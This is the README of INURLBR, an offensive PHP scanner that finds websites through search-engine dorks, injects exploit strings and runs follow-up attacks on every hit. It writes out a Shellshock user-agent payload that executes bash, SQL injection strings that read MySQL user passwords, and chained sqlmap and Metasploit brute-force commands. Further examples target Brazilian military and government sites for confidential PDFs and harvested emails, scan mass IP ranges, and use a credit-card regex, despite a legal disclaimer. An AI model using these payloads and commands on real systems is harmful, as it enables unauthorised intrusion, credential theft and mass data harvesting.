SCANNER - INURLBR
===============

>Advanced search in search engines, enables analysis provided to exploit GET / POST capturing emails & urls, with an internal custom validation junction for each target / url found.
```
   +-----------------------------------------------------------------------------+
   |  [!] Legal disclaimer: Usage of INURLBR for attacking targets without prior |
   |  mutual consent is illegal.                                                 |
   |  It is the end user's responsibility to obey all applicable local, state and|
   |  federal laws.                                                              |
   |  Developers assume no liability and are not responsible for any misuse or   |
   |  damage caused by this program                                              |
   +-----------------------------------------------------------------------------+
```


```
  [+] AUTOR:        googleINURL
  [+] EMAIL:        inurlbr@gmail.com
  [+] Blog:         http://blog.inurl.com.br
  [+] Twitter:      https://twitter.com/googleinurl
  [+] Fanpage:      https://fb.com/InurlBrasil
  [+] Pastebin      http://pastebin.com/u/Googleinurl
  [+] GIT:          https://github.com/googleinurl
  [+] PSS:          http://packetstormsecurity.com/user/googleinurl
  [+] EXA:          http://exploit4arab.net/author/248/Cleiton_Pinheiro
  [+] YOUTUBE:      http://youtube.com/c/INURLBrasil
  [+] PLUS:         http://google.com/+INURLBrasil
```

 * GROUP INURL BRASIL - ADVANCED SEARCH.
 * SCRIPT NAME:        INURLBR
 * Codename:           Subversive
 * Version:            2.1.0


- Screenshot:
------
![Screenshot](http://3.bp.blogspot.com/-H1DjYjXjqXU/VWPNTUnfeaI/AAAAAAAAA_E/B24JDIxrq3o/s1600/inurlbr.png)
![Screenshot](http://4.bp.blogspot.com/-XAohC-ga9EM/VWU1l3a3QcI/AAAAAAAAA_o/BRg0mIllOgQ/s1600/sqlmap.png)
![Screenshot](http://4.bp.blogspot.com/-bOOilZLyUFg/VWQCdHKCAwI/AAAAAAAAA_U/JAy1ChdQJU0/s1600/post.png)
![Screenshot](http://2.bp.blogspot.com/-kCYgptMhfts/VWU2eTTTKFI/AAAAAAAAA_w/eGSt7qg4HRo/s1600/exploits.png)
- LIB & PERMISSION:
------
```
 ----------------------------------------------------------
PHP Version         5.4.7
php5-curl           LIB
php5-cli            LIB   
cURL support        enabled
cURL Information    7.24.0
allow_url_fopen     On
permission          Reading & Writing
User                root privilege, or is in the sudoers group
Operating system    LINUX
Proxy random        TOR 
 ----------------------------------------------------------
[+] PERMISSION EXECUTION: chmod +x inurlbr.php
[+] INSTALLING LIB CURL: sudo apt-get install php5-curl
[+] INSTALLING LIB CLI: sudo apt-get install php5-cli
[+] INSTALLING PROXY TOR https://www.torproject.org/docs/debian.html.en
 ----------------------------------------------------------
resume: apt-get install curl libcurl3 libcurl3-dev php5 php5-cli php5-curl
```
- HELP:
------
```
-h
--help   Alternative long length help command.
--ajuda  Command to specify Help.
--info   Information script.
--update Code update.    
-q       Choose which search engine you want through [1...24] / [e1..6]]:
     [options]:
     1   - GOOGLE / (CSE) GENERIC RANDOM / API
     2   - BING
     3   - YAHOO BR
     4   - ASK
     5   - HAO123 BR
     6   - GOOGLE (API)
     7   - LYCOS
     8   - UOL BR
     9   - YAHOO US
     10  - SAPO
     11  - DMOZ
     12  - GIGABLAST
     13  - NEVER
     14  - BAIDU BR
     15  - YANDEX
     16  - ZOO
     17  - HOTBOT
     18  - ZHONGSOU
     19  - HKSEARCH
     20  - EZILION
     21  - SOGOU
     22  - DUCK DUCK GO
     23  - BOOROW
     24  - GOOGLE(CSE) GENERIC RANDOM
     ----------------------------------------
                 SPECIAL MOTORS
     ----------------------------------------
     e1  - TOR FIND
     e2  - ELEPHANT
     e3  - TORSEARCH
     e4  - WIKILEAKS
     e5  - OTN
     e6  - EXPLOITS SHODAN
     ----------------------------------------
     all - All search engines / not special motors
     Default:    1
     Example: -q {op}
     Usage:   -q 1
              -q 5
               Using more than one engine:  -q 1,2,5,6,11,24
               Using all engines:      -q all
     
 --proxy Choose which proxy you want to use through the search engine:
     Example: --proxy {proxy:port}
     Usage:   --proxy localhost:8118
              --proxy socks5://googleinurl@localhost:9050
              --proxy http://admin:12334@172.16.0.90:8080
   
 --proxy-file Set font file to randomize your proxy to each search engine.
     Example: --proxy-file {proxys}
     Usage:   --proxy-file proxys_list.txt

 --time-proxy Set the time how often the proxy will be exchanged.
     Example: --time-proxy {second}
     Usage:   --time-proxy 10

 --proxy-http-file Set file with urls http proxy, 
     are used to bular capch search engines
     Example: --proxy-http-file {youfilehttp}
     Usage:   --proxy-http-file http_proxys.txt
         

 --tor-random Enables the TOR function, each usage links an unique IP.
 
 -t  Choose the validation type: op 1, 2, 3, 4, 5
     [options]:
     1   - The first type uses default errors considering the script:
     It establishes connection with the exploit through the get method.
     Demo: www.alvo.com.br/pasta/index.php?id={exploit}
   
     2   -  The second type tries to valid the error defined by: -a='VALUE_INSIDE_THE _TARGET'
     It also establishes connection with the exploit through the get method
     Demo: www.alvo.com.br/pasta/index.php?id={exploit}
   
     3   - The third type combine both first and second types:
     Then, of course, it also establishes connection with the exploit through the get method
     Demo: www.target.com.br{exploit}
     Default:    1
     Example: -t {op}
     Usage:   -t 1
     
     4   - The fourth type a validation based on source file and will be enabled scanner standard functions.
     The source file their values are concatenated with target url.
     - Set your target with command --target {http://target}
     - Set your file with command -o {file}
     Explicative:
     Source file values:
     /admin/index.php?id=
     /pag/index.php?id=
     /brazil.php?new=
     Demo: 
     www.target.com.br/admin/index.php?id={exploit}
     www.target.com.br/pag/index.php?id={exploit}
     www.target.com.br/brazil.php?new={exploit}
     
     5   - (FIND PAGE) The fifth type of validation based on the source file,
     Will be enabled only one validation code 200 on the target server, or if the url submit such code will be considered vulnerable.
     - Set your target with command --target {http://target}
     - Set your file with command -o {file}
     Explicative:
     Source file values:
     /admin/admin.php
     /admin.asp
     /admin.aspx
     Demo: 
     www.target.com.br/admin/admin.php
     www.target.com.br/admin.asp
     www.target.com.br/admin.aspx
     Observation: If it shows the code 200 will be separated in the output file

     DEFAULT ERRORS:  
     
     [*]JAVA INFINITYDB, [*]LOCAL FILE INCLUSION, [*]ZIMBRA MAIL,           [*]ZEND FRAMEWORK, 
     [*]ERROR MARIADB,   [*]ERROR MYSQL,          [*]ERROR JBOSSWEB,        [*]ERROR MICROSOFT,
     [*]ERROR ODBC,      [*]ERROR POSTGRESQL,     [*]ERROR JAVA INFINITYDB, [*]ERROR PHP,
     [*]CMS WORDPRESS,   [*]SHELL WEB,            [*]ERROR JDBC,            [*]ERROR ASP,
     [*]ERROR ORACLE,    [*]ERROR DB2,            [*]JDBC CFM,              [*]ERROS LUA, 
     [*]ERROR INDEFINITE
     
         
 --dork Defines which dork the search engine will use.
     Example: --dork {dork}
     Usage:   --dork 'site:.gov.br inurl:php? id'
     - Using multiples dorks:
     Example: --dork {[DORK]dork1[DORK]dork2[DORK]dork3}
     Usage:   --dork '[DORK]site:br[DORK]site:ar inurl:php[DORK]site:il inurl:asp'
 
 --dork-file Set font file with your search dorks.
     Example: --dork-file {dork_file}
     Usage:   --dork-file 'dorks.txt'

 --exploit-get Defines which exploit will be injected through the GET method to each URL found.
     Example: --exploit-get {exploit_get}
     Usage:   --exploit-get "?'´%270x27;"
     
 --exploit-post Defines which exploit will be injected through the POST method to each URL found.
     Example: --exploit-post {exploit_post}
     Usage:   --exploit-post 'field1=valor1&field2=valor2&field3=?´0x273exploit;&botao=ok'
     
 --exploit-command Defines which exploit/parameter will be executed in the options: --command-vul/ --command-all.   
     The exploit-command will be identified by the paramaters: --command-vul/ --command-all as _EXPLOIT_      
     Ex --exploit-command '/admin/config.conf' --command-all 'curl -v _TARGET__EXPLOIT_'
     _TARGET_ is the specified URL/TARGET obtained by the process
     _EXPLOIT_ is the exploit/parameter defined by the option --exploit-command.
     Example: --exploit-command {exploit-command}
     Usage:   --exploit-command '/admin/config.conf'  
     
 -a  Specify the string that will be used on the search script:
     Example: -a {string}
     Usage:   -a '<title>hello world</title>'
     
 -d  Specify the script usage op 1, 2, 3, 4, 5.
     Example: -d {op}
     Usage:   -d 1 /URL of the search engine.
              -d 2 /Show all the url.
              -d 3 /Detailed request of every URL.
              -d 4 /Shows the HTML of every URL.
              -d 5 /Detailed request of all URLs.
              -d 6 /Detailed PING - PONG irc.    
             
 -s  Specify the output file where it will be saved the vulnerable URLs.
     
     Example: -s {file}
     Usage:   -s your_file.txt
     
 -o  Manually manage the vulnerable URLs you want to use from a file, without using a search engine.
     Example: -o {file_where_my_urls_are}
     Usage:   -o tests.txt
   
 --persist  Attempts when Google blocks your search.
     The script tries to another google host / default = 4
     Example: --persist {number_attempts}
     Usage:   --persist 7

 --ifredirect  Return validation method post REDIRECT_URL
     Example: --ifredirect {string_validation}
     Usage:   --ifredirect '/admin/painel.php'

 -m  Enable the search for emails on the urls specified.
  
 -u  Enables the search for URL lists on the url specified.
 
 --gc Enable validation of values ​​with google webcache.
     
 --pr  Progressive scan, used to set operators (dorks), 
     makes the search of a dork and valid results, then goes a dork at a time.
  
 --file-cookie Open cookie file.
     
 --save-as Save results in a certain place.

 --shellshock Explore shellshock vulnerability by setting a malicious user-agent.
 
 --popup Run --command all or vuln in a parallel terminal.

 --cms-check Enable simple check if the url / target is using CMS.

 --no-banner Remove the script presentation banner.
     
 --unique Filter results in unique domains.

 --beep Beep sound when a vulnerability is found.
     
 --alexa-rank Show alexa positioning in the results.
     
 --robots Show values file robots.
      
 --range Set range IP.
      Example: --range {range_start,rage_end}
      Usage:   --range '172.16.0.5#172.16.0.255'

 --range-rand Set amount of random ips.
      Example: --range-rand {rand}
      Usage:   --range-rand '50'

 --irc Sending vulnerable to IRC / server channel.
      Example: --irc {server#channel}
      Usage:   --irc 'irc.rizon.net#inurlbrasil'

 --http-header Set HTTP header.
      Example: --http-header {youemail}
      Usage:   --http-header 'HTTP/1.1 401 Unauthorized,WWW-Authenticate: Basic realm="Top Secret"'
          
 --sedmail Sending vulnerable to email.
      Example: --sedmail {youemail}
      Usage:   --sedmail youemail@inurl.com.br
          
 --delay Delay between research processes.
      Example: --delay {second}
      Usage:   --delay 10
  
 --time-out Timeout to exit the process.
      Example: --time-out {second}
      Usage:   --time-out 10

 --ifurl Filter URLs based on their argument.
      Example: --ifurl {ifurl}
      Usage:   --ifurl index.php?id=

 --ifcode Valid results based on your return http code.
      Example: --ifcode {ifcode}
      Usage:   --ifcode 200
 
 --ifemail Filter E-mails based on their argument.
     Example: --ifemail {file_where_my_emails_are}
     Usage:   --ifemail sp.gov.br

 --url-reference Define referring URL in the request to send him against the target.
      Example: --url-reference {url}
      Usage:   --url-reference http://target.com/admin/user/valid.php
 
 --mp Limits the number of pages in the search engines.
     Example: --mp {limit}
     Usage:   --mp 50
     
 --user-agent Define the user agent used in its request against the target.
      Example: --user-agent {agent}
      Usage:   --user-agent 'Mozilla/5.0 (X11; U; Linux i686) Gecko/20071127 Firefox/2.0.0.11'
      Usage-exploit / SHELLSHOCK:   
      --user-agent '() { foo;};echo; /bin/bash -c "expr 299663299665 / 3; echo CMD:;id; echo END_CMD:;"'
      Complete command:    
      php inurlbr.php --dork '_YOU_DORK_' -s shellshock.txt --user-agent '_YOU_AGENT_XPL_SHELLSHOCK' -t 2 -a '99887766555'
 
 --sall Saves all urls found by the scanner.
     Example: --sall {file}
     Usage:   --sall your_file.txt

 --command-vul Every vulnerable URL found will execute this command parameters.
     Example: --command-vul {command}
     Usage:   --command-vul 'nmap sV -p 22,80,21 _TARGET_'
              --command-vul './exploit.sh _TARGET_ output.txt'
              --command-vul 'php miniexploit.php -t _TARGET_ -s output.txt'
                  
 --command-all Use this commmand to specify a single command to EVERY URL found.
     Example: --command-all {command}
     Usage:   --command-all 'nmap sV -p 22,80,21 _TARGET_'
              --command-all './exploit.sh _TARGET_ output.txt'
              --command-all 'php miniexploit.php -t _TARGET_ -s output.txt'
    [!] Observation:
   
    _TARGET_ will be replaced by the URL/target found, although if the user  
    doesn't input the get, only the domain will be executed.
   
    _TARGETFULL_ will be replaced by the original URL / target found.
       
    _TARGETXPL_ will be replaced by the original URL / target found + EXPLOIT --exploit-get.
       
    _TARGETIP_ return of ip URL / target found.
        
    _URI_ Back URL set of folders / target found.
        
    _RANDOM_ Random strings.
        
    _PORT_ Capture port of the current test, within the --port-scan process.
   
    _EXPLOIT_  will be replaced by the specified command argument --exploit-command.
   The exploit-command will be identified by the parameters --command-vul/ --command-all as _EXPLOIT_

 --replace Replace values ​​in the target URL.
    Example:  --replace {value_old[INURL]value_new}
     Usage:   --replace 'index.php?id=[INURL]index.php?id=1666+and+(SELECT+user,Password+from+mysql.user+limit+0,1)=1'
              --replace 'main.php?id=[INURL]main.php?id=1+and+substring(@@version,1,1)=1'
              --replace 'index.aspx?id=[INURL]index.aspx?id=1%27´'
                  
 --remove Remove values ​​in the target URL.
      Example: --remove {string}
      Usage:   --remove '/admin.php?id=0'
              
 --regexp Using regular expression to validate his research, the value of the 
    Expression will be sought within the target/URL.
    Example:  --regexp {regular_expression}
    All Major Credit Cards:
    Usage:    --regexp '(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14}|6011[0-9]{12}|3(?:0[0-5]|[68][0-9])[0-9]{11}|3[47][0-9]{13})'
    
    IP Addresses:
    Usage:    --regexp '((?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?))'
    
    EMAIL:   
    Usage:    --regexp '([\w\d\.\-\_]+)@([\w\d\.\_\-]+)'
    

 ---regexp-filter Using regular expression to filter his research, the value of the 
     Expression will be sought within the target/URL.
    Example:  ---regexp-filter {regular_expression}
    EMAIL:   
    Usage:    ---regexp-filter '([\w\d\.\-\_]+)@([\w\d\.\_\-]+)'
 

    [!] Small commands manager:
    
 --exploit-cad Command register for use within the scanner.
    Format {TYPE_EXPLOIT}::{EXPLOIT_COMMAND}
    Example Format: NMAP::nmap -sV _TARGET_
    Example Format: EXPLOIT1::php xpl.php -t _TARGET_ -s output.txt
    Usage:    --exploit-cad 'NMAP::nmap -sV _TARGET_' 
    Observation: Each registered command is identified by an id of your array.
                 Commands are logged in exploits.conf file.

 --exploit-all-id Execute commands, exploits based on id of use,
    (all) is run for each target found by the engine.
     Example: --exploit-all-id {id,id}
     Usage:   --exploit-all-id 1,2,8,22
         
 --exploit-vul-id Execute commands, exploits based on id of use,
    (vull) run command only if the target was considered vulnerable.
     Example: --exploit-vul-id {id,id}
     Usage:   --exploit-vul-id 1,2,8,22

 --exploit-list List all entries command in exploits.conf file.


    [!] Running subprocesses:
    
 --sub-file  Subprocess performs an injection 
     strings in URLs found by the engine, via GET or POST.
     Example: --sub-file {youfile}
     Usage:   --sub-file exploits_get.txt
         
 --sub-get defines whether the strings coming from 
     --sub-file will be injected via GET.
     Usage:   --sub-get
         
 --sub-post defines whether the strings coming from 
     --sub-file will be injected via POST.
     Usage:   --sub-get
         

 --sub-cmd-vul Each vulnerable URL found within the sub-process
     will execute the parameters of this command.
     Example: --sub-cmd-vul {command}
     Usage:   --sub-cmd-vul 'nmap sV -p 22,80,21 _TARGET_'
              --sub-cmd-vul './exploit.sh _TARGET_ output.txt'
              --sub-cmd-vul 'php miniexploit.php -t _TARGET_ -s output.txt'
                  
 --sub-cmd-all Run command to each target found within the sub-process scope.
     Example: --sub-cmd-all {command}
     Usage:   --sub-cmd-all 'nmap sV -p 22,80,21 _TARGET_'
              --sub-cmd-all './exploit.sh _TARGET_ output.txt'
              --sub-cmd-all 'php miniexploit.php -t _TARGET_ -s output.txt'


 --port-scan Defines ports that will be validated as open.
     Example: --port-scan {ports}
     Usage:   --port-scan '22,21,23,3306'
         
 --port-cmd Define command that runs when finding an open door.
     Example: --port-cmd {command}
     Usage:   --port-cmd './xpl _TARGETIP_:_PORT_'
              --port-cmd './xpl _TARGETIP_/file.php?sqli=1'

 --port-write Send values for door.
     Example: --port-write {'value0','value1','value3'}
     Usage:   --port-write "'NICK nk_test','USER nk_test 8 * :_ola','JOIN #inurlbrasil','PRIVMSG #inurlbrasil : minha_msg'"



    [!] Modifying values used within script parameters:
    
 md5 Encrypt values in md5.
     Example: md5({value})
     Usage:   md5(102030)
     Usage:   --exploit-get 'user?id=md5(102030)'

 base64 Encrypt values in base64.
     Example: base64({value})
     Usage:   base64(102030)
     Usage:   --exploit-get 'user?id=base64(102030)'
         
 hex Encrypt values in hex.
     Example: hex({value})
     Usage:   hex(102030)
     Usage:   --exploit-get 'user?id=hex(102030)'

 Generate random values.
     Example: random({character_counter})
     Usage:   random(8)
     Usage:   --exploit-get 'user?id=random(8)'

```


- COMMANDS SIMPLE:
------
```
./inurlbr.php --dork 'inurl:php?id=' -s save.txt -q 1,6 -t 1 --exploit-get "?´'%270x27;"  
   
./inurlbr.php --dork 'inurl:aspx?id=' -s save.txt -q 1,6 -t 1 --exploit-get "?´'%270x27;" 
   
./inurlbr.php --dork 'site:br inurl:aspx (id|new)' -s save.txt -q 1,6 -t 1 --exploit-get "?´'%270x27;"
   
./inurlbr.php --dork 'index of wp-content/uploads' -s save.txt -q 1,6,2,4 -t 2 --exploit-get '?' -a 'Index of /wp-content/uploads'
   
./inurlbr.php --dork 'site:.mil.br intext:(confidencial) ext:pdf' -s save.txt -q 1,6 -t 2 --exploit-get '?' -a 'confidencial'
   
./inurlbr.php --dork 'site:.mil.br intext:(secreto) ext:pdf' -s save.txt -q 1,6 -t 2 --exploit-get '?' -a 'secreto'        
  
./inurlbr.php --dork 'site:br inurl:aspx (id|new)' -s save.txt -q 1,6 -t 1 --exploit-get "?´'%270x27;"
   
./inurlbr.php --dork '.new.php?new id' -s save.txt -q 1,6,7,2,3 -t 1 --exploit-get '+UNION+ALL+SELECT+1,concat(0x3A3A4558504C4F49542D5355434553533A3A,@@version),3,4,5;' -a '::EXPLOIT-SUCESS::'
  
./inurlbr.php --dork 'new.php?id=' -s teste.txt  --exploit-get ?´0x27  --command-vul 'nmap sV -p 22,80,21 _TARGET_'
   
./inurlbr.php --dork 'site:pt inurl:aspx (id|q)' -s bruteforce.txt --exploit-get ?´0x27 --command-vul 'msfcli auxiliary/scanner/mssql/mssql_login RHOST=_TARGETIP_ MSSQL_USER=inurlbr MSSQL_PASS_FILE=/home/pedr0/Documentos/passwords E'
  
./inurlbr.php --dork 'site:br inurl:id & inurl:php' -s get.txt --exploit-get "?´'%270x27;" --command-vul 'python ../sqlmap/sqlmap.py -u "_TARGETFULL_" --dbs'
  
./inurlbr.php --dork 'inurl:index.php?id=' -q 1,2,10 --exploit-get "'?´0x27'" -s report.txt --command-vul 'nmap -Pn -p 1-8080 --script http-enum --open _TARGET_'
 
./inurlbr.php --dork 'site:.gov.br email' -s reg.txt -q 1  --regexp '([\w\d\.\-\_]+)@([\w\d\.\_\-]+)'
  
./inurlbr.php --dork 'site:.gov.br email (gmail|yahoo|hotmail) ext:txt' -s emails.txt -m
  
./inurlbr.php --dork 'site:.gov.br email (gmail|yahoo|hotmail) ext:txt' -s urls.txt -u
 
./inurlbr.php --dork 'site:gov.bo' -s govs.txt --exploit-all-id  1,2,6  
 
./inurlbr.php --dork 'site:.uk' -s uk.txt --user-agent  'Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)' 
 
./inurlbr.php --dork-file 'dorksSqli.txt' -s govs.txt --exploit-all-id  1,2,6 
 
./inurlbr.php --dork-file 'dorksSqli.txt' -s sqli.txt --exploit-all-id  1,2,6  --irc 'irc.rizon.net#inurlbrasil'   
  
./inurlbr.php --dork 'inurl:"cgi-bin/login.cgi"' -s cgi.txt --ifurl 'cgi' --command-all 'php xplCGI.php _TARGET_'  
 
./inurlbr.php --target 'http://target.com.br' -o cancat_file_urls_find.txt -s output.txt -t 4
  
./inurlbr.php --target 'http://target.com.br' -o cancat_file_urls_find.txt -s output.txt -t 4 --exploit-get "?´'%270x27;"
  
./inurlbr.php --target 'http://target.com.br' -o cancat_file_urls_find.txt -s output.txt -t 4 --exploit-get "?pass=1234" -a '<title>hello! admin</title>'
  
./inurlbr.php --target 'http://target.com.br' -o cancat_file_urls_find_valid_cod-200.txt -s output.txt -t 5
  
./inurlbr.php --range '200.20.10.1,200.20.10.255' -s output.txt --command-all 'php roteador.php _TARGETIP_'  
 
./inurlbr.php --range-rad '1500' -s output.txt --command-all 'php roteador.php _TARGETIP_'  
 
./inurlbr.php --dork-rad '20' -s output.txt --exploit-get "?´'%270x27;" -q 1,2,6,4,5,9,7,8  
 
./inurlbr.php --dork-rad '20' -s output.txt --exploit-get "?´'%270x27;" -q 1,2,6,4,5,9,7,8   --pr
 
./inurlbr.php --dork-file 'dorksCGI.txt' -s output.txt -q 1,2,6,4,5,9,7,8   --pr --shellshock
 
./inurlbr.php --dork-file 'dorks_Wordpress_revslider.txt' -s output.txt -q 1,2,6,4,5,9,7,8  --sub-file 'xpls_Arbitrary_File_Download.txt'  
```

- Installation
----
Preferably, you can download inurlbr by cloning the [Git](https://github.com/googleinurl/SCANNER-INURLBR) repository:
```
    git clone https://github.com/googleinurl/SCANNER-INURLBR.git inurlbr
```
The inurlbr works with [php](http://php.net/downloads.php) version **5.4.x**  linux platforms.

- Giving permission to script execution:
------
```
$chmod +x inurlbr.php
Executar: ./inurlbr.php
```

- Usage
----

To get a list of basic options and switches use:
```
    php inurlbr.php -h
```
To get a list of all options and switches use:
```
    php inurlbr.php --help
```


* Demos: [http://youtube.com/c/INURLBrasil](https://www.youtube.com/playlist?list=PLV1376pVwcCmcoCmq_Z4O0ra4BqjmhIaR)
* Tutoriais: [http://blog.inurl.com.br/search/label/INURLBR](http://blog.inurl.com.br/search/label/INURLBR)
* IRC: irc.rizon.net / #inurlbrasil
